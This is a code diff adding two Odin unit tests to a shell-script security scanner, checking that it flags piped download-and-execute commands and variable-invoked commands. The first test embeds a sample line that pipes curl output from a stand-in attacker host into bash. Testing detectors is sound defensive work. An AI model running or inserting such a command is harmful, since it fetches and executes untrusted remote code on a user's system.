@@ -2357,3 +2357,37 @@ test_scan_security_batch_guardrails_and_ast_signatures :: proc(t: ^testing.T) {
 	}
 	testing.expect(t, has_dash_c, "ast signature scan should detect shell -c dynamic risk")
 }
+
+@(test)
+test_scan_security_ast_pipe_download_exec_normalized_command_names :: proc(t: ^testing.T) {
+	if !should_run_test("test_scan_security_ast_pipe_download_exec_normalized_command_names") { return }
+	src := "/usr/bin/curl http://evil.example | /bin/bash\n"
+	result := scan_security(src, .Bash)
+	defer destroy_security_scan_result(&result)
+
+	has_ast_pipe := false
+	for finding in result.findings {
+		if finding.rule_id == "sec.ast.pipe_download_exec" {
+			has_ast_pipe = true
+			break
+		}
+	}
+	testing.expect(t, has_ast_pipe, "ast pipe download rule should trigger for normalized command names")
+}
+
+@(test)
+test_scan_security_ast_indirect_exec_from_source_fragment :: proc(t: ^testing.T) {
+	if !should_run_test("test_scan_security_ast_indirect_exec_from_source_fragment") { return }
+	src := "cmd=echo\n$cmd hello\n"
+	result := scan_security(src, .Bash)
+	defer destroy_security_scan_result(&result)
+
+	has_indirect := false
+	for finding in result.findings {
+		if finding.rule_id == "sec.ast.indirect_exec" {
+			has_indirect = true
+			break
+		}
+	}
+	testing.expect(t, has_indirect, "ast indirect exec rule should trigger for variable-invoked command names")
+}
